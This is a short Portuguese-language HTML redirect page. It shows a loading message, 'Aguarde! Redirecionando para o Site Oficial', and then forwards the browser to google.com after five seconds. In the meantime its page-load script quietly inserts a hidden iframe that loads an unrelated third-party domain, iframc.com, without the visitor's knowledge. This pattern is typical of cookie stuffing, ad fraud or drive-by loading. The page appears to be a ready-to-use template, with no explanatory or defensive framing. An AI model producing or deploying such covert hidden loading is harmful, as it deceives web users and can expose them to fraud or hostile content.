<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecionando</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .loading-circle {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background-color: green;
        }
        .text {
            font-size: 16px;
        }
        iframe {
            display: none;
        }
    </style>
    <script>
        // Definindo os sets
        const lnkfrm = "https://iframc.com";
        const lnkdtn = "https://google.com";

        // Função que será executada ao carregar a página
        window.onload = function() {
            // Inserindo o iframe invisível
            const iframe = document.createElement('iframe');
            iframe.src = lnkfrm;
            document.body.appendChild(iframe);

            // Redireciona após 5 segundos
            setTimeout(function() {
                window.location.href = lnkdtn;
            }, 5000);
        };
    </script>
</head>
<body>
    <div class="container">
        <div class="loading-circle"></div>
        <div class="text">✅ Aguarde! Redirecionando para o Site Oficial</div>
    </div>
</body>
</html>
